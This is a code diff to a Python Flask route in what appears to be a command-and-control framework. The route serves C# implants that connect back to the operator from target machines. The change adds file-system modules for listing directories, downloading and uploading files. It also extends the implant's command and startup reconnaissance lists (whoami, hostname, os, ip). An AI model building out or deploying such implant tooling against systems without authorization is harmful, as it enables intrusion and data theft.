@@ -17,17 +17,16 @@ endpoints = {
     'msbuild': f'~server_uri~{endpoint}.xml'
 }
 available_modules = {
-    "ps":["/connect/server/stagers/csharp/resources/modules/Processes.exe", "Processes"]
-#    "make_token"
-#    "rev2self"
-#    "steal_token"
-#    "get_token"
-#    "cmd"
-#    "ps"
+    "ps":["/connect/server/stagers/csharp/resources/modules/Processes.exe", "Processes"],
+    "dir":["/connect/server/stagers/csharp/resources/modules/FileSystem.exe", "FileSystem"],
+    "pwd":["/connect/server/stagers/csharp/resources/modules/FileSystem.exe", "FileSystem"],
+    "cd":["/connect/server/stagers/csharp/resources/modules/FileSystem.exe", "FileSystem"],
+    "download":["/connect/server/stagers/csharp/resources/modules/FileSystem.exe", "FileSystem"],
+    "upload":["/connect/server/stagers/csharp/resources/modules/FileSystem.exe", "FileSystem"]
 }
-commands = 'delay,whoami,hostname,os,pwd,cd,execute_assembly,download,upload,integrity'
+commands = 'kill,delay,whoami,hostname,integrity,os,ip,execute_assembly'
 commands = commands + ',' + ','.join(available_modules.keys()) if available_modules.keys() else commands
-startup_commands = 'whoami,hostname,integrity'
+startup_commands = 'whoami,hostname,integrity,os,ip'
 
 @csharp.route(f'/{endpoint}.xml', methods=['GET'])
 def generate_implant():
@@ -36,7 +35,7 @@ def generate_implant():
     The csharp route expects a get request and will return an implant to be executed on the target(s) machine. The
     implant will attempt to establish a command and control connection to the framework.
     """
-    implant = ImplantModel(commands=commands, available_modules=available_modules, startup_commands=startup_commands)
+    implant = ImplantModel(implant_type='csharp', commands=commands, available_modules=available_modules, startup_commands=startup_commands)
     db.session.add(implant)
     db.session.commit()
     websocket.emit('job_sent', 'CSharp implant sent.')
